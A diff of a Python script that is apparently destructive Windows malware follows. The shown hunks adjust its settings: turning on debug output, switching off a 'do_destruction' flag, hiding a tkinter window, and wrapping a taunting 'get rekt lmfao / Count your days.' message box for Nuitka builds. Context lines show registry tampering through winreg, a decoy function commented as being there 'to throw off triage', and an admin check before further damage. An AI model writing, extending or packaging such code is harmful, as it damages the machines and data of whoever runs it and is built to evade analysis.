@@ -5,12 +5,14 @@ import subprocess
 import random as rand
 import requests, winreg
 import tkinter.messagebox as tkMsg
+import tkinter
 
 #Variables
 #inten = 8*1000 #corruption intensity ##Unused
-debug = False #console log stuff
-do_destruction = True
+debug = True #console log stuff
+do_destruction = False
 admCheck = ctypes.windll.shell32.IsUserAnAdmin()
+
 
 # to throw off triage
 def download():
@@ -34,6 +36,10 @@ def regFuck():
     except:
         print('bruh')
 
+#region main program
+# for textboxes to work properly
+window = tkinter.Tk()
+window.withdraw()
 
 # debug check
 if debug:
@@ -123,9 +129,13 @@ else:
             print('rerolling id: ' + str(i))
 
 
-# shows this message after destruction
+# final step
 if do_destruction:
-    tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')
+    # nuitka shit
+    try:
+        tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')
+    except:
+        print('on nuitka')
 
     if admCheck != 0:
         # try to do funny
